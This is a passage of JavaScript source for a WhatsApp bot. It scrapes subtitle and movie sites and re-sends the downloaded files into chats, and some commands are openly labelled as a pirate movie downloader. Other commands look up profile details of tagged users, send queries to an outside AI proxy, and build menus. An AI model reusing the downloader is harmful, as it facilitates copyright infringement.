title: "_[Result from subz.]_",
rows: srh
}]

    const listMessage = {
caption: `⏳ Search A SubsTitle Name: ${q}
📲 Search top 10 SubsTitles\n`,
image : { url: config.LOGO },	    	    
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Search By subz',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })



} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})
	


cmd({
    pattern: "subzdl",	
    react: '📑',
    category: "",
    desc: "pirate moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')

var response = await axios.get(q);
var $ = cheerio.load(response.data);

const title = $("h1.text-center.text-danger.h4").text();
const image = $("img.rounded.mx-auto.d-block.shadow-2-strong.mb-0.wp-post-image").attr("src");
const date = $("time").text().trim();
const dllink = $("a.btn.btn-outline-success.fw-bold").attr("href");
const size = $("li.list-group-item").text().trim();

const cap = `📃 *Title:* ${title}\n
📅 *Year:* ${date}\n
💫 *Size:* ${size}\n`
	

	    
  const sections = [
{
	title: "*🎬 SUB-SEARCH-SITE 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `zip ${dllink}|${title}` , description: `Download Substitles`},	
	]
    }	  
]
const listMessage = {
caption: cap,
image : { url: config.LOGO },	
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Search By subz',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})


//================SINHALSUBTITLE===============

cmd({
    pattern: "s-subtitle",	
    react: '📑',
    category: "movie",
    desc: "s-subtitle moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{

        if (!q) return await reply('*Please Give Me Text..! 🖊️*')
	const url = `https://sinhala-subtitles.com/?s=${q}`;
const response = await axios.get(url);
        var $ = cheerio.load(response.data);
        const results = [];
        
        $('article.l-post.grid-base-post.grid-post').each((i,element) => {
        results.push({
        
        link: $(element).find('a').attr("href"),
        image: $(element).find('span').attr("data-bgsrc"),
        title: $(element).find('a').attr("title"),
        date: $(element).find('time.post-date').text(),
        desc: $(element).find('p').text()
        
        })
            })

	
if (results.length < 1) return await conn.sendMessage(from, { text: "*මට කිසිවක් සොයාගත නොහැකි විය :(*" }, { quoted: mek } )
var srh = [];  
for (var i = 0; i < results.length; i++) {
srh.push({
title: i + 1,
description: results[i].title + '||' + results[i].date,
rowId: prefix + 'ssdl ' + results[i].link
});
}
const sections = [{
title: "_[Result from sinhala-subtitles.]_",
rows: srh
}]

    const listMessage = {
caption: `🎬 VAJIRA MD MOVIE-DL 🎬

   ⏳ Search A Movie Name: ${q}
📲 Search top 10 Movies\n`,
image : { url: config.LOGO },	    
footer: 'MOVIE DOWNLOADER BY VAJIRA MD',
title: 'Result from sinhala-subtitles. 📲',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})




cmd({
    pattern: "ssdl",	
    react: '📑',
    category: "",
    desc: "pirate moive downloader",
    filename: __filename
},
async (conn, m, mek, { from, prefix, q, l, isDev, reply }) => {
try{
        if (!q) return await reply('*Please Give Me Text..! 🖊️*')

const response = await axios.get(q);	
const $ = cheerio.load(response.data);
const title = $('h1.is-title.post-title').text();
const date = $('span.meta-item.date > time.post-date').text();
const image = $('a.image-link.media-ratio.ar-bunyad-main').attr("href");
const desc = $('p').text();
const dllink = $('figure > a').attr("href");

const cap = `📃 *Title:* ${title}\n
🔗 *Link:* ${dllink}\n
📅 *Year:* ${date}\n
⏳ *Views:* ${desc}\n`

	
  const sections = [
{
	title: "*🎬 MOVIE-SEARCH-SITE 🎬*",
	rows: [
	    {title: "    1.1", rowId: prefix + `zip ${dllink}|${title}` , description: 'Download in sinhala-subtitles'},	
	]
    }	  
]
const listMessage = {
caption: cap,
image : { url: image },	
footer: 'MOVIE DOWNLOADER BY VAJIR MD',
title: 'Search By sinhala-subtitles',
buttonText: '*🔢 Reply below number*',
sections
}
return await conn.replyList(from, listMessage ,{ quoted : mek })

} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})
	








//------------------------dl---------------






cmd({
    pattern: `mp4`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {


	    
        //const mediaUrl = q.trim();
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tc_movie_dl_system'
	    
     const response = await axios.get(mediaUrl);  
const $ = cheerio.load(response.data);
    const link = $("#link").attr("href")
const drain = link.replace(/u/g, 'api/file')   
console.log(drain)

var vajiralod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙴𝙳 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await conn.sendMessage(from, {text: 'ᴜᴘʟᴏᴀᴅɪɴɢ ᴍᴏᴠɪᴇ...'})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}



        const message = {
            document: await getBuffer(drain),
	    caption: `${title}\n\n*> 🎬 VAJIRA MD TEAM MOVIEDL 🎬*`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };


	    
        await conn.sendMessage(from, message );

        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});



cmd({
    pattern: `mp41`,
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {


	    
        //const mediaUrl = q.trim();
        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'tc_movie_dl_system'
	    
    


var vajiralod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙴𝙳 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await conn.sendMessage(from, {text: 'ᴜᴘʟᴏᴀᴅɪɴɢ ᴍᴏᴠɪᴇ...'})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}



        const message = {
            document: await getBuffer(mediaUrl),
	    caption: `${title}\n\n*> 🎬 VAJIRA MD TEAM MOVIEDL 🎬*`,
            mimetype: "video/mp4",
            fileName: `${title}.mp4`,
        };


	    
        await conn.sendMessage(from, message );

        await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});




cmd({
    pattern: "zip",
    react: "📥",
    dontAddCommandList: true,
    filename: __filename
}, async (conn, mek, m, { from, q, isDev, reply }) => {
	
    if (!q) {
        return await reply('*Please provide a direct URL!*');
    }


    try {


        const mediaUrl = q.split("|")[0]
        const title = q.split("|")[1]  || 'vajira_md_sub_dl_system'

        const response = await axios.get(mediaUrl, { responseType: 'arraybuffer' });
        const mediaBuffer = Buffer.from(response.data, 'binary');

var vajiralod = [
"《 █▒▒▒▒▒▒▒▒▒▒▒》10%",
"《 ████▒▒▒▒▒▒▒▒》30%",
"《 ███████▒▒▒▒▒》50%",
"《 ██████████▒▒》80%",
"《 ████████████》100%",
"𝙸𝙽𝙸𝚃𝙸𝙰𝙻𝙸𝚉𝙴𝙳 𝙲𝙾𝙼𝙿𝙻𝙴𝚃𝙴𝙳 🦄..."
]
let { key } = await conn.sendMessage(from, {text: 'ᴜᴘʟᴏᴀᴅɪɴɢ ᴍᴏᴠɪᴇ...'})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}


        const message = {
            document: await getBuffer(mediaUrl),
	    caption: "*🎬 VAJIRA MD SUB-DL 🎬*",
            mimetype: "VAJIRA MD SUB DL",
            fileName: `${title}.zip`,
        };

        await conn.sendMessage(from, message, { quoted: mek });
await conn.sendMessage(from, { react: { text: '✅', key: mek.key } });
    } catch (error) {
        console.error('Error fetching or sending', error);
        await conn.sendMessage(from, '*Error fetching or sending *', { quoted: mek });
    }
});

cmd({
    pattern: "person",
    react: "👤",
    alias: ["userinfo", "profile"],
    desc: "Get complete user profile information",
    category: "other",
    use: '.person [@tag or reply]',
    filename: __filename
},
async (conn, mek, m, { from, sender, isGroup, reply, quoted, participants }) => {
    try {
        // 1. DETERMINE TARGET USER
        let userJid = quoted?.sender || 
                     mek.message?.extendedTextMessage?.contextInfo?.mentionedJid?.[0] || 
                     sender;

        // 2. VERIFY USER EXISTS
        const [user] = await conn.onWhatsApp(userJid).catch(() => []);
        if (!user?.exists) return reply("❌ User not found on WhatsApp");

        // 3. GET PROFILE PICTURE
        let ppUrl;
        try {
            ppUrl = await conn.profilePictureUrl(userJid, 'image');
        } catch {
            ppUrl = 'https://i.ibb.co/KhYC4FY/1221bc0bdd2354b42b293317ff2adbcf-icon.png';
        }

        // 4. GET NAME (MULTI-SOURCE FALLBACK)
        let userName = userJid.split('@')[0];
        try {
            // Try group participant info first
            if (isGroup) {
                const member = participants.find(p => p.id === userJid);
                if (member?.notify) userName = member.notify;
            }
            
            // Try contact DB
            if (userName === userJid.split('@')[0] && conn.contactDB) {
                const contact = await conn.contactDB.get(userJid).catch(() => null);
                if (contact?.name) userName = contact.name;
            }
            
            // Try presence as final fallback
            if (userName === userJid.split('@')[0]) {
                const presence = await conn.presenceSubscribe(userJid).catch(() => null);
                if (presence?.pushname) userName = presence.pushname;
            }
        } catch (e) {
            console.log("Name fetch error:", e);
        }

        // 5. GET BIO/ABOUT
        let bio = {};
        try {
            // Try personal status
            const statusData = await conn.fetchStatus(userJid).catch(() => null);
            if (statusData?.status) {
                bio = {
                    text: statusData.status,
                    type: "Personal",
                    updated: statusData.setAt ? new Date(statusData.setAt * 1000) : null
                };
            } else {
                // Try business profile
                const businessProfile = await conn.getBusinessProfile(userJid).catch(() => null);
                if (businessProfile?.description) {
                    bio = {
                        text: businessProfile.description,
                        type: "Business",
                        updated: null
                    };
                }
            }
        } catch (e) {
            console.log("Bio fetch error:", e);
        }

        // 6. GET GROUP ROLE
        let groupRole = "";
        if (isGroup) {
            const participant = participants.find(p => p.id === userJid);
            groupRole = participant?.admin ? "👑 Admin" : "👥 Member";
        }

        // 7. FORMAT OUTPUT
        const formattedBio = bio.text ? 
            `${bio.text}\n└─ 📌 ${bio.type} Bio${bio.updated ? ` | 🕒 ${bio.updated.toLocaleString()}` : ''}` : 
            "No bio available";

        const userInfo = `
*GC MEMBER INFORMATION 🧊*

📛 *Name:* ${userName}
🔢 *Number:* ${userJid.replace(/@.+/, '')}
📌 *Account Type:* ${user.isBusiness ? "💼 Business" : user.isEnterprise ? "🏢 Enterprise" : "👤 Personal"}

*📝 About:*
${formattedBio}

*⚙️ Account Info:*
✅ Registered: ${user.isUser ? "Yes" : "No"}
🛡️ Verified: ${user.verifiedName ? "✅ Verified" : "❌ Not verified"}
${isGroup ? `👥 *Group Role:* ${groupRole}` : ''}
`.trim();

        // 8. SEND RESULT
        await conn.sendMessage(from, {
            image: { url: ppUrl },
            caption: userInfo,
            mentions: [userJid]
        }, { quoted: mek });

    } catch (e) {
        console.error("Person command error:", e);
        reply(`❌ Error: ${e.message || "Failed to fetch profile"}`);
    }
});

cmd({
    pattern: "botai",
    alias: ["laki6"], 
    react: "📑",
    desc: "ai chat.",
    category: "main",
    filename: __filename
},
async(conn, mek, m, {from, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try {
        // Check if the user is asking who made it
        if (q.toLowerCase().includes("කවුද හැදුවේ") || q.toLowerCase().includes("who made this")) {
            return reply(`QUEEN DINU MD OWNER IS FOUNDER`)
        }

        // Normal AI response
        let data = await fetchJson(`https://dark-shan-yt.koyeb.app/ai/gemini?q=${q}`)
        return reply(` ${data.data}\n\n> ㋛︎ ᴘᴏᴡᴇʀᴅ ʙʏ  ᴍʀ  𝐂𝐘𝐁𝐄𝐑 𝐃𝐈𝐍𝐔 𝐈𝐃 ᶜᵒᵈᵉʳ`)
    } catch(e) {
        console.log(e)
        reply(`අයියෝ බ්‍රෝ, එරර් එකක්! 😂\n${e}`)
    }
})

cmd({
    pattern: "menu2",
    react: "📂",
    alias: ["help"],
    desc: "Get bot\'s command list.",
    category: "main",
    use: '.menu',
    filename: __filename
},
async(conn, mek, m,{from, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname,  isSachintha, isSavi, isSadas, isMani, isMe,isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
    try{
    let menuc1 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'download'){
if(!commands[i].dontAddCommandList){
menuc1 += `*│►* .${commands[i].pattern}\n`
}}};

let menuc2 = ``
for (let i=0;i<commands.length;i++) { 
  if(commands[i].category === 'search'){
  if(!commands[i].dontAddCommandList){
  menuc2 += `*│⩥* .${commands[i].pattern}\n`
  }}};

let menuc3 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'convert'){
  if(!commands[i].dontAddCommandList){
    menuc3 += `*│►* .${commands[i].pattern}\n`
}}};

let menuc4 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'logo'){
  if(!commands[i].dontAddCommandList){
menuc4 += `*│►* .${commands[i].pattern}\n`
}}};

let menuc5 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'main'){
  if(!commands[i].dontAddCommandList){
menuc5 += `*│►* .${commands[i].pattern}\n`
}}};

let menuc6 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'group'){
if(!commands[i].dontAddCommandList){
  menuc6 += `*│⩥* .${commands[i].pattern}\n`
}}};

let menuc7 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'bug'){
if(!commands[i].dontAddCommandList){
  menuc7 += `*│⩥* .${commands[i].pattern}\n`
}}};	

let menuc8 = ``
for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'other'){
if(!commands[i].dontAddCommandList){
  menuc8 += `*│⩥* .${commands[i].pattern}\n`
}}};
     
let menumg = `*Hellow👸* ${pushname}

*╭─     ᴄᴏᴍᴍᴀɴᴅꜱ ᴘᴀɴᴇʟ*
*│🕵️‍♂️ 𝘙𝘶𝘯 𝘛𝘪𝘮𝘦 -* ${runtime(process.uptime())} 
*│🕵️‍♂️ 𝘙𝘢𝘮 𝘜𝘴𝘦 -* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*╰──────────●●►*
*👸 𝘝𝘈𝘑𝘐𝘙𝘈 𝘔𝘥 𝘊𝘰𝘮𝘮𝘢𝘮𝘥 𝘗𝘢𝘯𝘦𝘭*
*╭──────────●●►*
*│🧙‍♂️ DOWNLOAD COMMANDS*
*│   ───────*

${menuc1}*╰───────────●●►*
*╭──────────●●►*
*│🧙‍♂️ SEARCH COMMANDS*
*│   ───────*

${menuc2}*╰───────────●●►*

*╭──────────●●►*
*│🧙‍♂️ CONVERT COMMANDS*
*│   ───────*

${menuc3}*╰───────────●●►*

*╭──────────●●►*
*│🧙‍♂️ LOGO COMMANDS*
*│   ───────*

${menuc4}*╰───────────●●►*

*╭──────────●●►*
*│🧙‍♂️ MAIN COMMANDS*
*│   ───────*

${menuc5}*╰───────────●●►*

*╭──────────●●►*
*│🧙‍♂️ GROUP COMMANDS*
*│   ───────*

${menuc6}*╰───────────●●►*
		       
*╭──────────●●►*
*│🧙‍♂️ BUG COMMANDS*
*│   ───────*

${menuc7}*╰───────────●●►*	

*╭──────────●●►*
*│🧙‍♂️ OTHER COMMANDS*
*│   ───────*

${menuc8}*╰───────────●●►*	

👨‍💻 ᴠᴀᴊɪʀᴀ ᴍᴅ ʙʏ ᴛᴇᴄʜɴɪᴄᴀʟ ᴄʏʙᴇʀꜱ 👨‍💻`	


	    
await conn.sendMessage(from, { image: { url: config.LOGO }, caption: menumg }, { quoted: mek, messageId:genMsgId() })
} catch (e) {
reply('*Error !!*')
l(e)
}
})

cmd({
    pattern: "alive",
    react: "👨‍💻",
    alias: ["online","test","bot"],
    desc: "Check bot online or no.",
    category: "main",
    use: '.alive',
    filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{
	var msg = mek
if(os.hostname().length == 12 ) hostname = 'replit'
else if(os.hostname().length == 36) hostname = 'heroku'
else if(os.hostname().length == 8) hostname = 'koyeb'
else hostname = os.hostname()
let monspace ='```'
let monspacenew ='`'
var vajiralod = [
"LOADING ●●○○○○",
"LOADING ●●●●○○",
"LOADING ●●●●●●",
"`COMPLETED ✅`"	
]
let { key } = await conn.sendMessage(from, {text: ''})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}	

  const sections = [
    {
	title: "",
	rows: [
	    {title: "1", rowId: prefix + 'menu' , description: 'COMMANDS MENU'},
	    {title: "2", rowId: prefix + 'ping' , description: 'VAJIRA-MD SPEED'} ,

	]
    } 
]
const listMessage = {
caption: `${monspace}👋 කොහිමද ${pushname} I'm alive now${monspace}
    
*🚀Version:* ${require("../package.json").version}
*⌛Memory:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
*🕒Runtime:* ${runtime(process.uptime())}
*📍Platform:* ${hostname}

🐼This is the result of our teams hard work and our technical cybers team owns the bots rights and code rights. Therefore, you have no chance to change and submit our bot under any circumstances And 100 Commands And logo, thumbnail,banner Maker Commands Ai Chatbot feathers On Our Bot
                    
*🌻Have A Nice Day..*🌻`,
image : { url: config.LOGO },	
footer: config.FOOTER,
title: '',
buttonText: '*🔢 Reply below number*',
sections
}
	
return await conn.replyList(from, listMessage ,{ quoted : mek })
	
} catch (e) {
  reply('*ERROR !!*')
  l(e)
}
})

cmd({
  pattern: "menu",
  react: "👨‍💻",
  alias: ["panel","help","commands"],
  desc: "Get bot\'s command list.",
  category: "main",
  use: '.menu',
  filename: __filename
},
async(conn, mek, m,{from, prefix, l, quoted, body, isCmd, command, args, q, isGroup, sender, senderNumber, botNumber2, botNumber, pushname, isMe, isOwner, groupMetadata, groupName, participants, groupAdmins, isBotAdmins, isAdmins, reply}) => {
try{


if(os.hostname().length == 12 ) hostname = 'replit'
else if(os.hostname().length == 36) hostname = 'heroku'
else if(os.hostname().length == 8) hostname = 'koyeb'
else hostname = os.hostname()
let monspace ='```'
let monspacenew ='`'
const cap = `❖──👨‍💻 ＶＡＪＩＲＡ - ＭＤ 👨‍💻──❖

╭───═❮ *ᴍᴇɴᴜ ʟɪsᴛ* ❯═───❖
│ *🚀𝙑𝙀𝙍𝙎𝙄𝙊𝙉:* ${require("../package.json").version}
│ *⌛𝙈𝙀𝙈𝙊𝙍𝙔:* ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)}MB / ${Math.round(require('os').totalmem / 1024 / 1024)}MB
│ *🕒𝙍𝙐𝙉𝙏𝙄𝙈𝙀:* ${runtime(process.uptime())}
│ *📍𝙋𝙇𝘼𝙏𝙁𝙊𝙍𝙈:* ${hostname}
╰━━━━━━━━━━━━━━━┈⊷`
var vajiralod = [
"LOADING ●●○○○○",
"LOADING ●●●●○○",
"LOADING ●●●●●●",
"`COMPLETED ✅`"	
]
let { key } = await conn.sendMessage(from, {text: ''})

for (let i = 0; i < vajiralod.length; i++) {
await conn.sendMessage(from, {text: vajiralod[i], edit: key })
}	


if (config.MODE === 'nonbutton') {

const category = q.trim().toUpperCase();
let menuc = `*◈╾──────${category} DOWNLOAD COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        let wm = '*ᴅᴇᴡᴍɪɴɪ ᴍᴅ ᴡʜᴀᴛꜱᴀᴘᴘ ᴜꜱᴇʀ ʙᴏᴛ*\n*ᴛʜᴇ ᴛᴇᴀᴍ • ᴋᴏᴅ*'	

  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'download'){
  if(!commands[i].dontAddCommandList){

menuc += `• *${commands[i].pattern}*\n`
}}};
  menuc += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

let menuc1 = `*◈╾──────${category} SEARCH COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'search'){
  if(!commands[i].dontAddCommandList){

menuc1 += `• *${commands[i].pattern}*\n`
}}};
  menuc1  += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`



let menuc2 = `*◈╾──────${category} CONVERT COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'convert'){
  if(!commands[i].dontAddCommandList){

menuc2 += `• *${commands[i].pattern}*\n`
}}};
  menuc2 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`


let menuc3 = `*◈╾──────${category} LOGO COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'logo'){
  if(!commands[i].dontAddCommandList){

menuc3 += `• *${commands[i].pattern}*\n`
}}};
  menuc3 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`


let menuc4 = `*◈╾──────${category} MAIN COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'main'){
  if(!commands[i].dontAddCommandList){

menuc4 += `• *${commands[i].pattern}*\n`
}}};
  menuc4 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`
	
let menuc5 = `*◈╾──────${category} GROUP COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'group'){
  if(!commands[i].dontAddCommandList){

menuc5 += `• *${commands[i].pattern}*\n`
}}};
  menuc5 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`

let menuc6 = `*◈╾──────${category} BUG COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'bug'){
  if(!commands[i].dontAddCommandList){

menuc6 += `• *${commands[i].pattern}*\n`
}}};
  menuc6 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`
	
let menuc7 = `*◈╾──────${category} OTHER COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'other'){
  if(!commands[i].dontAddCommandList){

menuc7 += `• *${commands[i].pattern}*\n`
}}};
  menuc7 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`
	
let menuc8 = `*◈╾──────${category} MOVIE COMMAND LIST──────╼◈*\n\n> Select you want command type and enjoy Dewmini md whatsapp bot 👨‍💻\n\n`;
        
  for (let i=0;i<commands.length;i++) { 
if(commands[i].category === 'movie'){
  if(!commands[i].dontAddCommandList){

menuc8 += `• *${commands[i].pattern}*\n`
}}};
  menuc8 += `\n⭓ *Total Commands List ${category}*: ${commands.filter(cmd => cmd.category.toUpperCase() === category).length}\n\n${wm}`
	
let msg = generateWAMessageFromContent(
      m.chat,
      {
        viewOnceMessage: {
          message: {
            interactiveMessage: {
              body: {
                text: `` },
              carouselMessage: {
                cards: [
                  {
                    
                    header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/qe6de0.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: '' },
                    nativeFlowMessage: {
                      
                    },
                  },
                  {                   

header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/lazbax.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc1,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {

                    },
                  },
                  {                   

header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/qaycw6.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc2,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },
                  {                   
			  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/5nkov1.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc3,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },                                    

                  {                   
			  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/w76ykx.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc4,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },                                    
                      {                   
			  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/bkii0v.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc5,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },        
	                  {                   
			  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/i7rh4x.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc6,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },         
	                  {             
	                  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/u0ant7.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc8,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },         
	                  {                                                 
			  			  
header: proto.Message.InteractiveMessage.Header.create({
          ...(await prepareWAMessageMedia({ image: { url: 'https://files.catbox.moe/qw3o01.jpg' } }, { upload: conn.waUploadToServer })),
          title: menuc7,
          gifPlayback: true,
          subtitle: "DEWMINI-MD",
          hasMediaAttachment: false
        }),
                    body: { text: ``},
                    nativeFlowMessage: {
                      
                    },
                  },                                    		
                ],
                            messageVersion: 1,
                        },
                         contextInfo: {
                         mentionedJid: [m.sender],
                         forwardingScore: 999,
                         isForwarded: true,
                         forwardedNewsletterMessageInfo: {
                         newsletterJid: '120363292101892024@newsletter',
                         newsletterName: `⛅ 𝘋𝘌𝘞𝘔𝘐𝘕𝘐 𝘔𝘋 💙`,
                         serverMessageId: 143
                            }
                        }
                    }
                }
            },
        },
        { quoted: m })
        
            await conn.relayMessage(msg.key.remoteJid, msg.message, {
      messageId: msg.key.id,
    });
    

} if (config.MODE === 'button') {


        let sections = [{
                title: '🔑 Select menu type',
                rows: [{
                        title: 'DOWNLOAD MENU',
                        description: `Download commands`,
                        id: `${prefix}downmenu`
                    },
                    {
                        title: `SEARCH MENU`,
                        description: 'Search commands',
                        id: `${prefix}searchmenu`
                    },
		    {
                        title: `CONVERT MENU`,
                        description: 'Convert commands',
                        id: `${prefix}convertmenu`
                    },
                    {
                        title: `MAIN MENU`,
                        description: 'Convert commands',
                        id: `${prefix}mainmenu`
                    },
		    {
                        title: `GROUP MENU`,
                        description: 'Group commands',
